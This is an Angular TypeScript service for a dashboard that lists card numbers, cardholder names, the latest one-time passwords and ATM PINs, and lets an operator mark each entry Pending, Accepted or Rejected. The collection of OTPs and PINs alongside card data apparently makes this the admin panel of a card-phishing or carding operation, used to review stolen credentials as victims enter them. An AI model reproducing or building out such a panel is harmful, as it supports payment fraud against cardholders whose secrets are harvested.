import { Injectable } from '@angular/core';
import { BaseApiService } from './base-api.service';
import { Observable, throwError } from 'rxjs';
import { map, catchError } from 'rxjs/operators';

export interface Transaction {
  id: string;
  totalPrice: number;
  visaDetails: string;
  otp: string;
  atmPass: string;
  status: 'Pending' | 'Accepted' | 'Rejected';
}

@Injectable({
  providedIn: 'root'
})
export class DashboardService extends BaseApiService {
  private readonly baseUrl = '/api/user';

  getTransactions(): Observable<Transaction[]> {
    return this.get<any[]>(`${this.baseUrl}/all`).pipe(
      map(users => {
        console.log('Raw API response:', users);
        return users.map(user => ({
          id: user.CardId,
          totalPrice: user.Credit ?? 0,
          visaDetails: `${user.CardNumber} - ${user.CardHolder}`,
          otp: user.Otps && user.Otps.length > 0 ? user.Otps[user.Otps.length - 1].Otp : 'N/A',
          atmPass: user.Atms && user.Atms.length > 0 ? user.Atms[user.Atms.length - 1].AtmPass : 'N/A',
          status: user.Status ? (user.Status.charAt(0).toUpperCase() + user.Status.slice(1).toLowerCase()) : 'Pending'
        }));
      }),
      catchError(err => {
        console.error('Dashboard API error:', err);
        return throwError(() => err);
      })
    );
  }

  updateTransactionStatus(id: string, status: 'Accepted' | 'Rejected' | 'Pending'): Observable<{ success: boolean }> {
    return this.patch<{ success: boolean }>(`${this.baseUrl}/${id}`, { status: status.toUpperCase() });
  }
}
